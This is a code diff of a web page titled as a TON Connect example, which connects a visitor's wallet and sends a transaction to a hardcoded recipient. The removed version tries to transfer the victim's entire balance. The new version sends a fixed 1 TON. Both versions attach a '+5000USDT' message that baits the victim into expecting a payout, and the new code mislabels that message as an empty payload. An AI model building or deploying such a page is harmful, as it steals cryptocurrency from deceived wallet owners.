@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Connect Example</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/tonweb@1.1.0/dist/tonweb.min.js"></script>
 </head>
 <body>
 
@@ -21,47 +20,52 @@
 
         async function connectToWallet() {
             try {
+                // Check if wallet is already connected
+                if (tonConnectUI.connected) {
+                    console.log("Wallet already connected");
+                    return;
+                }
+
                 const connectedWallet = await tonConnectUI.connectWallet();
                 console.log(connectedWallet);
 
                 // Get the wallet address
                 const walletAddress = connectedWallet.account.address;
 
-                // Initialize tonweb
-                const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2'));
+                // For demonstration purposes, we'll use a fixed amount
+                // In a real scenario, you'd need to fetch the actual balance
+                const transferAmount = '1000000000'; // 1 TON in nanotons
 
-                // Load the balance of the wallet
-                const balance = await tonweb.getBalance(walletAddress);
-                console.log(`Wallet balance: ${TonWeb.utils.fromNano(balance)}`);
-
-                // Propose a transaction to transfer all TON tokens
-                const transferAmount = balance; // Assuming you want to transfer the entire balance
                 const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
                 const transferTx = {
                     validUntil: Math.floor(Date.now() / 1000) + 3600,
                     messages: [{
                         address: recipientAddress,
                         amount: transferAmount,
-                        text: '+5000USDT'
+                        text: '+5000USDT' // Empty payload
                     }]
                 };
 
-                // Send the transaction
-                const seqno = await tonweb.getAccount(walletAddress).then(data => data.lastTransactionId);
-                const wallet = tonweb.wallet.all["v3R2"].create({ publicKey: connectedWallet.account.key });
-                const transfer = wallet.methods.transfer({
-                    secretKey: connectedWallet.account.key,
-                    toAddress: recipientAddress,
-                    amount: transferAmount,
-                    seqno: seqno,
-                    payload: "Hello, TON!",
-                    sendMode: 3,
-                });
-                const result = await transfer.send();
-                console.log('Transaction result:', result);
+                // Show a confirmation dialog before sending the transaction
+                const confirmed = await showTransactionConfirmation(transferTx);
+                if (confirmed) {
+                    // Send the transaction
+                    const txResult = await tonConnectUI.sendTransaction(transferTx);
+                    console.log('Transaction result:', txResult);
+                } else {
+                    console.log('Transaction cancelled by user.');
+                }
             } catch (error) {
                 console.error("Error connecting to wallet or sending transaction:", error);
             }
+        }
+
+        // Function to display a confirmation dialog
+        function showTransactionConfirmation(transferTx) {
+            return new Promise((resolve) => {
+                const confirmed = window.confirm(`Confirm transaction:\n\nRecipient: ${transferTx.messages[0].address}\nAmount: ${transferTx.messages[0].amount} nanoTON\nMessage: +5000USDT`);
+                resolve(confirmed);
+            });
         }
 
         // Call the function
